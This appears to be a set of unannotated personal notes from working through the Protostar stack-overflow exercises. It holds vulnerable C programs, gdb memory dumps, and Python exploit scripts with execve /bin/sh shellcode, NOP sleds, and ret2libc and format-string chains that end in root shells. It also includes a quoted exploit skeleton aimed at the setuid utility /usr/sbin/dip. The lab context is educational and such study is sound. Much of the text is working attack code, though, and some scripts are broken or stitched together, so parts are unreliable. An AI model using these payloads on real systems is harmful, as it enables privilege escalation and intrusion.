https://www.win.tue.nl/~aeb/linux/hh/hh-10.html
http://phrack.org/issues/49/14.html
http://shell-storm.org/shellcode/files/shellcode-827.php
https://www.exploit-db.com/exploits/13357
https://www.exploit-db.com/papers/13197
https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf
https://www.exploit-db.com/docs/english/28553-linux-classic-return-to-libc-&-return-to-libc-chaining-tutorial.pdf
https://exploit.education/protostar/


(gdb) x/s *((char **)environ+12)


About

Protostar introduces the following in a friendly way:

    Network programming
    Byte order
    Handling sockets
    Stack overflows
    Format strings
    Heap overflows The above is introduced in a simple way, starting with simple memory corruption and modification, function redirection, and finally executing custom shellcode.

In order to make this as easy as possible to introduce Address Space Layout Randomisation and Non-Executable memory has been disabled.
Getting started

Once the virtual machine has booted, you are able to log in as the "user" account with the password "user" (without the quotes).

The levels to be exploited can be found in the /opt/protostar/bin directory.

For debugging the final levels, you can log in as root with password "godmode" (without the quotes)
Core files

README! The /proc/sys/kernel/core_pattern is set to /tmp/core.%s.%e.%p. This means that instead of the general ./core file you get, it will be in a different directory and different file name.

Source: https://exploit.education/
From v1 to v2 - Moved from OVA to bootable CD format. Reduces issues with importing OVA files. 




echo "set disassembly-flavor intel" > ~/.gdbinit
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb


#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}



(gdb) disassemble  main
Dump of assembler code for function main:
0x080483f4 <main+0>:    push   ebp
0x080483f5 <main+1>:    mov    ebp,esp
0x080483f7 <main+3>:    and    esp,0xfffffff0
0x080483fa <main+6>:    sub    esp,0x60
0x080483fd <main+9>:    mov    DWORD PTR [esp+0x5c],0x0
0x08048405 <main+17>:   lea    eax,[esp+0x1c]
0x08048409 <main+21>:   mov    DWORD PTR [esp],eax
0x0804840c <main+24>:   call   0x804830c <gets@plt>
0x08048411 <main+29>:   mov    eax,DWORD PTR [esp+0x5c]
0x08048415 <main+33>:   test   eax,eax
0x08048417 <main+35>:   je     0x8048427 <main+51>
0x08048419 <main+37>:   mov    DWORD PTR [esp],0x8048500
0x08048420 <main+44>:   call   0x804832c <puts@plt>
0x08048425 <main+49>:   jmp    0x8048433 <main+63>
0x08048427 <main+51>:   mov    DWORD PTR [esp],0x8048529
0x0804842e <main+58>:   call   0x804832c <puts@plt>
0x08048433 <main+63>:   leave  
0x08048434 <main+64>:   ret    
End of assembler dump.

printf("(int)&modified-(int)&buffer = %d \n", (int)&modified-(int)&buffer);
(int)&modified-(int)&buffer = 64 

user@protostar:~/test$ python -c "print('A'*65)" > input
user@protostar:~/test$ ./stack0  < input 
(int)&modified-(int)&buffer = 64 
you have changed the 'modified' variable


#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}


user@protostar:~/test$ ./stack1 $(python -c "print('A'*64+'\x64\x63\x62\x61')")

== stack3.c

#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  printf("(int)&fp-(int)&buffer=%d\n",(int)&fp-(int)&buffer);
  gets(buffer);

  if(fp) {
      printf("0x%08x\n", &fp);
      printf("0x%08x\n", fp);
      printf("Win address 0x%08x\n", win);
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}




Test :
user@protostar:~/test$ python -c "print('A'*64+'\x42\x43\x44\x45')" > input 
user@protostar:~/test$ ./stack3 < input 
(int)&fp-(int)&buffer=64
0xbffff7dc
0x45444342
Win address 0x08048424
calling function pointer, jumping to 0x45444342
Segmentation fault
user@protostar:~/test


Exploit : 
user@protostar:~/test$ python -c "print('A'*64+'\x24\x84\x04\x08')" > input 
user@protostar:~/test$ ./stack3 < input 
(int)&fp-(int)&buffer=64
0xbffff7dc
0x08048424
Win address 0x08048424
calling function pointer, jumping to 0x08048424
code flow successfully changed
user@protostar:~/test$


==stack4.c

#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}



└─$  /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

(gdb) r
Starting program: /home/user/test/stack4 
win addrese 0x08048424
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Program received signal SIGSEGV, Segmentation fault.
0x63413563 in ?? ()


└─$  /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x63413563
[*] Exact match at offset 76


user@protostar:~/test$ python -c "print('A'*76 + 'B'*4)" > input 
(gdb) r < input 
Starting program: /home/user/test/stack4 < input
win addrese 0x08048424

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()

0x80483f4

user@protostar:~/test$ python -c "print('A'*76 + '\x24\x84\x04\x08')" > input 

user@protostar:~/test$ python -c "print('A'*76 + '\xf4\x83\x04\x08')" > input 

(gdb) r < input 
Starting program: /home/user/test/stack4 < input
win addrese 0x08048424
code flow successfully changed

Program received signal SIGSEGV, Segmentation fault.
0x00000000 in ?? ()


user@protostar:~/test$ ./stack4  < input 
win addrese 0x08048424
code flow successfully changed
Segmentation fault



==Stack5
https://medium.com/@coturnix97/exploit-exercises-protostar-stack-5-963731ff4b71
https://sh3llc0d3r.com/protostar-exploit-exercises-stack5/
https://secinject.wordpress.com/2017/06/07/protostar-stack5/

https://www.reddit.com/r/LiveOverflow/comments/f1exvl/protostar_stack5_shellcode_not_working_in_the/
https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}


(gdb) disassemble  main
Dump of assembler code for function main:
0x080483c4 <main+0>:    push   ebp
0x080483c5 <main+1>:    mov    ebp,esp
0x080483c7 <main+3>:    and    esp,0xfffffff0
0x080483ca <main+6>:    sub    esp,0x50
0x080483cd <main+9>:    lea    eax,[esp+0x10]
0x080483d1 <main+13>:   mov    DWORD PTR [esp],eax
0x080483d4 <main+16>:   call   0x80482e8 <gets@plt>
0x080483d9 <main+21>:   leave  
0x080483da <main+22>:   ret    
End of assembler dump.




0xbffff7be in ?? ()
(gdb) x/32wx $1
0xbffff770:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff780:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff790:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff7a0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff7b0:     0x41414141      0x41414141      0x41414141      0xbffff770
0xbffff7c0:     0x00000000      0xbffff864      0xbffff86c      0xb7fe1848
0xbffff7d0:     0xbffff820      0xffffffff      0xb7ffeff4      0x08048232
0xbffff7e0:     0x00000001      0xbffff820      0xb7ff0626      0xb7fffab0




user@protostar:~/test$ cat stack5.py 
import struct

eip = struct.pack("I", 0xbffff770+8)
	
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
            
shellcode +="\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
    



payload = "\x90"*10
payload += shellcode
payload += "\x90" * (76 - len(payload))
payload += eip
print(payload)

user@protostar:~/test$ (python stack5.py ; cat) | /opt/protostar/bin/stack5 
whoami
root

exit : 0xb7ec60c0


(gdb) x/32wx $esp-0x50
0xbffffc50:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffc60:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffc70:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffc80:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffc90:     0x41414141      0x41414141      0x41414141      0x42424242
0xbffffca0:     0x00000000      0xbffffd44      0xbffffd50      0xb7fe1848
0xbffffcb0:     0xbffffd00      0xffffffff      0xb7ffeff4      0x08048234
0xbffffcc0:     0x00000001      0xbffffd00      0xb7ff0626      0xb7fffab0


import struct

trap = "\xcc"
nop = "\x90"
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
shellcode +="\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

#gdb : 0xbffffc50
eip = struct.pack("I", 0xbffffc50)
exit = struct.pack("I", 0xb7ec60c0)

#buffer = "A"*76+"B"*4
#buffer = "A"*76+eip

#buffer = nop*4
buffer = shellcode
#buffer += nop*1
#buffer += exit
buffer += nop*(76-len(buffer))
buffer += eip

print buffer


#include <stdio.h>
#include <string.h>

void main(int argc, char *argv[]) {
  char buffer[64];

  if (argc > 1)
    strcpy(buffer,argv[1]);
}





import struct

trap = "\xcc"
nop = "\x90"
shellcode = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"

#shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
#shellcode +="\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

payload = "A"*76+"B"*4


payload = nop*(76 - len(shellcode))
payload += shellcode
payload += struct.pack("I", 0xbffff740)
#payload += struct.pack("I", 0xbffff740+0x30)

# NOP | /bin/sh 00 | system | exit | addr /bin/sh

#print len(shellcode)
print payload




user@protostar:~/exploit$ cat input 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC

(gdb) r < input 
Starting program: /opt/protostar/bin/stack5 < input

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) x/s $esp
0xbffff7c0:      'C' <repeats 100 times>
(gdb) x/32wx $esp
0xbffff7c0:     0x43434343      0x43434343      0x43434343      0x43434343
0xbffff7d0:     0x43434343      0x43434343      0x43434343      0x43434343
0xbffff7e0:     0x43434343      0x43434343      0x43434343      0x43434343
0xbffff7f0:     0x43434343      0x43434343      0x43434343      0x43434343
0xbffff800:     0x43434343      0x43434343      0x43434343      0x43434343
0xbffff810:     0x43434343      0x43434343      0x43434343      0x43434343
0xbffff820:     0x43434343      0xb7ff6200      0xb7eadb9b      0xb7ffeff4
0xbffff830:     0x00000001      0x08048310      0x00000000      0x08048331



import struct

#payload = 'A'*76 + 'B'*4  + 'C'*100

eip = struct.pack("I", 0xbffff7c0+8)

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
shellcode +="\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

payload = "A"*76
payload += eip
payload += "\x90" * (90 - len(shellcode))
payload += shellcode
payload += "\x90"*10 

print(payload)

user@protostar:~/exploit$ (cat input; cat ) | /opt/protostar/bin/stack5 
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
whoami



== Stack6

#include <stdio.h>
extern int system();
extern int exit();

int main() {
        printf("system : 0x%08x\n", system);
        printf("exit : 0x%08x\n", exit);
}


user@protostar:~/exploit$ ./fa 
system : 0x08048340
exit : 0x08048370

user@protostar:~/exploit$ ldd fa
        linux-gate.so.1 =>  (0xb7fe4000)
        libc.so.6 => /lib/libc.so.6 (0xb7e99000)
        /lib/ld-linux.so.2 (0xb7fe5000)

user@protostar:~/exploit$ cat fa1.c 
#include <stdio.h>

int main(){
        char *p;

        p = 0xb7e99000;
        while (1) {
                while (*p++ != '/') ;
                if (strcmp(p-1, "/bin/sh") == 0) {
                        printf("0x%08x\n", p-1);
                        return 0;
                }
        }
}

user@protostar:~/exploit$ ./fa1
0xb7fb63bf


user@protostar:~/exploit$ gdb fa
(gdb) break main
Breakpoint 1 at 0x8048437
(gdb) r
Starting program: /home/user/exploit/fa 

Breakpoint 1, 0x08048437 in main ()
(gdb) x/s 0xb7fb63bf
0xb7fb63bf:      "/bin/sh"

┌──(kali㉿kali)-[~]
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
                                                                                           
┌──(kali㉿kali)-[~]
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x37634136
[*] Exact match at offset 80

user@protostar:~/exploit$ cat input 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEE

(gdb) r < input 

Starting program: /opt/protostar/bin/stack6 < input
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBAAAAAAAAAAAABBBBCCCCDDDD

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) x/8xw $esp
0xbffff7b0:     0x43434343      0x44444444      0xbffff800      0xb7eadc76
0xbffff7c0:     0x00000001      0xbffff864      0xbffff86c      0xb7fe1848

(gdb) p system
$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>
(gdb) x/s 0xb7fb63bf
0xb7fb63bf:      "/bin/sh"


user@protostar:~/exploit$ cat exploit6.py 
import struct

#system= "B"*4
#exit = "C"*4
#sh = "D"*4

system = struct.pack("I", 0xb7ecffb0)
exit = struct.pack("I", 0xb7ec60c0)
sh = struct.pack("I", 0xb7fb63bf)

payload = "A"*80
payload += system
payload += exit
payload += sh
print payload



user@protostar:~/exploit$ (cat input ; cat) | /opt/protostar/bin/stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����AAAAAAAAAAAA�����`췿c��
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
whoami
root




https://www.win.tue.nl/~aeb/linux/hh/hh-5.html
#include <stdio.h>
#include <stdlib.h>

int main(int ac, char **av) {
        while (--ac > 0) {
                char *p = getenv(*++av);
                printf("%p\n", p);
        }
        return 0;
}



https://www.win.tue.nl/~aeb/linux/hh/hh-3.html

% cat mysh.c
#include <unistd.h>
int main() { return execl("/bin/sh", "sh", "-i", NULL); }
% cat mysh.sh
#!/bin/sh
exec /bin/sh -i




#define BUFSZ 500
#define ALIGNMENT 0
#define PATH "/path/to/vulnerable/utility"

char shellcode[]="..my_favorite_shellcode..";
char buf[BUFSZ];

int main() {
        char *env[2] = {shellcode, NULL};
        int ret = 0xbffffffa - strlen(shellcode) - strlen(PATH);
        int i, *p = (int *)(buf + ALIGNMENT);

        for (i = 0; i+4 < BUFSZ; i += 4)
                *p++ = ret;

        return execle(PATH, PATH, buf, NULL, env);
}




export FORMATSTRING="%3\$n"
export FAV="\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"


Breakpoint 1, main (argc=1, argv=0xbffff874) at stack6/stack6.c:27
27      stack6/stack6.c: No such file or directory.
        in stack6/stack6.c

(gdb) p printf
$1 = {<text variable, no debug info>} 0xb7eddf90 <__printf>
(gdb) p execl
$2 = {<text variable, no debug info>} 0xb7f2e460 <*__GI_execl>



user@protostar:~$ export FORMATSTRING="%3\$n"
user@protostar:~$ export FAV="\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0
\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

user@protostar:~$ ./getenvaddr 
Usage: ./getenvaddr <environment variable> <target program name>

user@protostar:~$ ./getenvaddr FORMATSTRING /opt/protostar/bin/stack6
FORMATSTRING will be at 0xbffff8f5
user@protostar:~$ ./getenvaddr FAV /opt/protostar/bin/stack6
FAV will be at 0xbffffea0






/opt/protostar/bin/stack6
/home/user/stackxxxxxxxxx
import struct

#| buffer (80) | printf | execl | formatstring | prg | prg | here |

printf = struct.pack("I", 0xb7eddf90)
execl = struct.pack("I", 0xb7f2e460)
formatstring = struct.pack("I", 0xbffff8f5)
prg =  struct.pack("I", 0xbffffea0)
here = "A"*4

payload = "A"*80
payload += printf
payload += execl
payload += formatstring
payload += prg
payload += prg
payload += here

print payload





Breakpoint 1, 0x080483c7 in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
system: 0x08048340
exit: 0x08048370


user@protostar:~/test$ gcc getenv.c -o getenv
user@protostar:~/test$ ./getenv FAV
FAV is stored at address 0xbffffeab
user@protostar:~/test$ ../getenvaddr 
Usage: ../getenvaddr <environment variable> <target program name>
user@protostar:~/test$ ../getenvaddr FAV ./vulnprog
FAV will be at 0xbffffea7
user@protostar:~/test$ ../getenvaddr FAV /home/user/test/vulnprog
FAV will be at 0xbffffe8b


user@protostar:~/test$ export HACK="/bin/sh"
user@protostar:~/test$ ./getenv HACK
HACK is stored at address 0xbffff8fd
user@protostar:~/test$ ../getenvaddr HACK /home/user/test/vulnprog
HACK will be at 0xbffff8dd





import struct

-----------------------------------------------------------------------------  
|     system() addr     |     return address     |     system() argument    |
-----------------------------------------------------------------------------


system = struct.pack("I", 0xb7eddf90)
hack = struct.pack("I", 0xbffff8dd)
execl = struct.pack("I", 0xb7f2e460)
formatstring = struct.pack("I", 0xbffff8f5)
prg =  struct.pack("I", 0xbffffea0)
here = "A"*4

payload = "A"*80
payload += printf
payload += execl
payload += formatstring
payload += prg
payload += prg
payload += here

print payload


system: 0x08048340
exit: 0x08048370



Starting program: /home/user/test/vulnprog 

Breakpoint 1, 0x08048437 in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>




#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {

if(argc < 2) {
printf("Usage: %s <environ_var>\n", argv[0]);
exit(-1);
}

char *addr_ptr;

addr_ptr = getenv(argv[1]);

if(addr_ptr == NULL) {
printf("Environmental variable %s does not exist!\n", argv[1]);
exit(-1);
}

printf("%s is stored at address %p\n", argv[1], addr_ptr);
addr_ptr = 0xbffff9c5;
while (*addr_ptr != '\0')
        printf("%c",*addr_ptr++);

printf("\n\n");
return(0);
}

┌──(kali㉿kali)-[~]
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 40
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2A
                                                                                           
┌──(kali㉿kali)-[~]
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x36614135
[*] Exact match at offset 17



(gdb)  x/s *((char **)environ)
0xbffff99d:      "USER=user"
(gdb) show env
HACK=/bin/sh
SHELL=/bin/sh
TERM=xterm-256color
SSH_CLIENT=172.16.227.1 42960 22
SSH_TTY=/dev/pts/0
USER=user
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31:*.taz=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lz=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.rar=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.axv=01;35:*.anx=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.axa=00;36:*.oga=00;36:*.spx=00;36:*.xspf=00;36:
PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
MAIL=/var/mail/user
PWD=/home/user
LANG=en_US.UTF-8
SHLVL=1
HOME=/home/user


(gdb)  x/s *((char **)environ+13)
0xbfffff81:      "SHELL=/bin/sh"


user@protostar:~$ ldd fa1
        linux-gate.so.1 =>  (0xb7fe4000)
        libc.so.6 => /lib/libc.so.6 (0xb7e99000)
        /lib/ld-linux.so.2 (0xb7fe5000)

user@protostar:~$ cat fa1.c
#include <stdio.h>

int main(){
        char *p;

        p = 0xb7e99000;
        while (1) {
                while (*p++ != '/') ;
                if (strcmp(p-1, "/bin/sh") == 0) {
                        printf("0x%08x\n", p-1);
                        return 0;
                }
        }
}

user@protostar:~$ ./fa1 
0xb7fb63bf



user@protostar:~$ cat exploit.py 
import os
import struct

getchar = struct.pack("I", 0xb7ef6570)
exit = struct.pack("I", 0xb7ec60c0)
system = struct.pack("I", 0xb7ecffb0)
sh = struct.pack("I", 0xb7fb63bf)

payload = "A"*17
#payload += getchar
payload += system
payload += exit
payload += sh

print payload




user@protostar:~$ cat fav.c 
main() { setuid(0); execl("/bin/sh", "/bin/sh", 0); }


(gdb) disassemble main
Dump of assembler code for function main:
0x080483f4 <main+0>:    push   ebp
0x080483f5 <main+1>:    mov    ebp,esp
0x080483f7 <main+3>:    and    esp,0xfffffff0
0x080483fa <main+6>:    sub    esp,0x10
0x080483fd <main+9>:    mov    DWORD PTR [esp],0x0
0x08048404 <main+16>:   call   0x8048330 <setuid@plt>
0x08048409 <main+21>:   mov    DWORD PTR [esp+0x8],0x0
0x08048411 <main+29>:   mov    DWORD PTR [esp+0x4],0x80484f0
0x08048419 <main+37>:   mov    DWORD PTR [esp],0x80484f0
0x08048420 <main+44>:   call   0x8048320 <execl@plt>
0x08048425 <main+49>:   leave  
0x08048426 <main+50>:   ret    
End of assembler dump.




user@protostar:~$ cat test.c 
#include <stdio.h>

extern int system(), exit(), execl();
void main() {
        printf("system : 0x%08x\n", system);
        printf("exit : 0x%08x\n", exit);
        printf("execl : 0x%08x\n", execl);
        printf("printf : 0x%08x\n", printf);
}


user@protostar:~$ gdb ./test 

(gdb) break main
Breakpoint 1 at 0x8048477
(gdb) p system
$1 = {<text variable, no debug info>} 0x804836c <system@plt>
(gdb) p exit
$2 = {<text variable, no debug info>} 0x80483ac <exit@plt>
(gdb) p execl
$3 = {<text variable, no debug info>} 0x804838c <execl@plt>
(gdb) p printf
$4 = {<text variable, no debug info>} 0x804839c <printf@plt>
(gdb) r
Starting program: /home/user/test 

Breakpoint 1, 0x08048477 in main ()
(gdb) p system
$5 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
(gdb) p exit
$6 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>
(gdb) p execl
$7 = {<text variable, no debug info>} 0xb7f2e460 <*__GI_execl>
(gdb) p printf
$8 = {<text variable, no debug info>} 0xb7eddf90 <__printf>


user@protostar:~$ ./test 
system : 0x0804836c
exit : 0x080483ac
execl : 0x0804838c
printf : 0x0804839c



user@protostar:~$ export fav=/home/user/fav
user@protostar:~$  export NULLSTR="%3\$n"

user@protostar:~$ ./getenvaddr fav  /home/user/vulnprog
fav will be at 0xbfffffc3

user@protostar:~$ ./getenvaddr NULLSTR  /home/user/vulnprog
NULLSTR will be at 0xfffffff2


17 + 5
GARBAGE|printf() addr|execl() addr| %3$n addr|wrapper addr|wrapper addr|addr of here 

import os
import struct

getchar = struct.pack("I", 0xb7ef6570)
exit = struct.pack("I", 0xb7ec60c0)
system = struct.pack("I", 0xb7ecffb0)
sh = struct.pack("I", 0xb7fb63bf)

printf = struct.pack("I", 0xb7eddf90)
execl = struct.pack("I", 0xb7f2e460)
fmt = struct.pack("I", 0xfffffff2)
fav = struct.pack("I", 0xbfffffc3)

here = struct.pack("I", 0xbffff79b + 17 + 20)

payload = "A"*17
payload += printf
payload += execl
payload += fmt
payload += fav
payload += fav
payload += here

print payload



===
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {
        if(argc < 2) {
                printf("Usage: %s <string>\n", argv[0]);
                exit(-1);
        }

        char buf[64];

        printf("addr of buf is: %p\n", buf);

        strcpy(buf, argv[1]);
        return(0);
}





(gdb) p system
$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
(gdb) x/s 0xb7fb63bf
0xb7fb63bf:      "/bin/sh"
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>


addr system | addr exit | addr /bin/sh



import os
import struct

nop = "\x90"
eip = struct.pack("I", 0xbffff760+8)


getchar = struct.pack("I", 0xb7ef6570)
system = struct.pack("I", 0xb7ecffb0)
exit = struct.pack("I", 0xb7ec60c0)
sh = struct.pack("I", 0xb7fb63bf)

printf = struct.pack("I", 0xb7eddf90)
execl = struct.pack("I", 0xb7f2e460)
fmt = struct.pack("I", 0xfffffff2)
fav = struct.pack("I", 0xbfffffc3)

here = struct.pack("I", 0xbffff79b + 17 + 20)

payload = "A"*76
payload += system
payload += exit
payload += sh


print payload



addr execl | addr /bin/sh | addr /bin/sh | 0


victim.c

char sc[]=
"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

char large_str[50];

void main()
{
        int i;
        char foo[12];

        int *ap = (int *)large_str;

        for (i = 0; i < 50; i += 4)
                *ap++ = sc;
        strcpy(foo, large_str);
}



#include <stdio.h>
#include <string.h>
#include <unistd.h>

#define BUFSIZE 221
#define ALIGNMENT 1

char sc[]=
"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

void main()
{
        char *env[3] = {sc, NULL};
        char buf[BUFSIZE];
        int i;
        int *ap = (int *)(buf + ALIGNMENT);
        int ret = 0xbffffffa - strlen(sc) - strlen("/usr/sbin/dip");

        for (i = 0; i < BUFSIZE - 4; i += 4)
                *ap++ = ret;

        execle("/usr/sbin/dip", "dip", "-k", "-l", buf, NULL, env);
}



#define BUFSZ 500
#define ALIGNMENT 0
#define PATH "/path/to/vulnerable/utility"

char shellcode[]="..my_favorite_shellcode..";
char buf[BUFSZ];

int main() {
        char *env[2] = {shellcode, NULL};
        int ret = 0xbffffffa - strlen(shellcode) - strlen(PATH);
        int i, *p = (int *)(buf + ALIGNMENT);

        for (i = 0; i+4 < BUFSZ; i += 4)
                *p++ = ret;

        return execle(PATH, PATH, buf, NULL, env);
}




#include <stdio.h>
#include <string.h>
int main(int argc, char *argv[]) {

  char test[1024];
  strcpy(test,argv[1]);
  printf("You wrote:");
  printf(test);
  printf("\n");

}




cat > vuln.c
int main(int argc, char **argv) {
        char buff[30];

        if (argc == 2)
                strcpy(buff, argv[1]);
        return 0;
}


Breakpoint 1, main (argc=1, argv=0xbffff884) at vuln.c:4
4               if (argc == 2)
(gdb) p getchar
$1 = {int (void)} 0xb7ef6570 <getchar>
(gdb) p system
$2 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
(gdb) p exit
$3 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>

